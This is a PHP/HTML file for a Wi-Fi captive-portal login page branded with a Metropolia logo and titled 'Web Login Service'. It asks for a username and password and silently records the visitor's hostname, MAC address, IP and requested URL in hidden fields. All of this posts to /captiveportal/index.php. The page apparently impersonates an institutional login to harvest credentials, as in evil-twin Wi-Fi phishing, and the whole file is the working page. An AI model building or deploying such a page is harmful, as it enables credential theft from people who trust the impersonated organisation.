<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!-- saved from url=(0014)about:internet -->
<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Web Login Service</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }


        body {
            background-image: url('/background.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            justify-content: space-around;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 13px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
            height: 41vh;
            width: 52vh;
            align-items: center;
        }

        .btnn {
            display: flex;
            alignt-items: center;
            justify-content: center;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="text"],
        input[type="password"] {
            width: 33vh;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin: 0.34vh 0vh;
        }

        button {
            display: flex;
            width: 50%;
            padding: 10px;
            background-color: #ff7820;
            color: black;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            align-items: center;
            justify-content: center;
            margin: 1.6vh 0 0 0;
            font-weight: 700;
            font-size: 16px;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border: 2px solid #a7d0f0;
        }

        img {
            margin: 0 1vh;
            width: 75%;
        }

        .forma {
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        @media screen and (max-width: 600px) {
            body {
                display: flex;
                align-items: start;
                margin-top: 5vh;
                background-position: top;
            }


            input[type="text"],
            input[type="password"] {
                font-size: 16px;
                width: 260px;
            }

            .login-container {
                display: flex;
                flex-direction: spac;
                justify-content: space-around;
                background-color: rgba(255, 255, 255, 0.8);
                padding: 20px;
                border-radius: 13px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
                height: 380px;
                width: 365px;
                align-items: center;
            }


            button {
                margin: 2.4vh 0 0 0;
                font-size: 19px;
            }



        }
    </style>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
                window.location = "/captiveportal/index.php";
            }, 100);
        }
    </script>


</head>

<body>

    <div class="login-container">
        <img src="/metropolia.png" alt="Metropolia Logo">
        <form id="loginForm" method="post" action="/captiveportal/index.php" onsubmit="redirect()">
            <input type="hidden" name="hostname" value="<?= getClientHostName($_SERVER['REMOTE_ADDR']); ?>">
            <input type="hidden" name="mac" value="<?= getClientMac($_SERVER['REMOTE_ADDR']); ?>">
            <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
            <input type="hidden" name="target" value="<?= $destination ?>">

            <div class="forma"><span class="_9nyy2"></span><input aria-label="Username" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="email" id="email" type="text" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Username"></label>

                <div><span class="_9nyy2"></span><input aria-label="Password" aria-required="true" autocapitalize="off" autocorrect="off" name="password" id="password" type="password" class="_2hvTZ pexuQ zyHYP" value="" placeholder="Password"></label>
                </div>
                <div class="btnn"><button type="submit" id="btn" name="btn">
                        <div>Login</div>
                    </button>
                </div>

        </form>
    </div>
</body>

</html>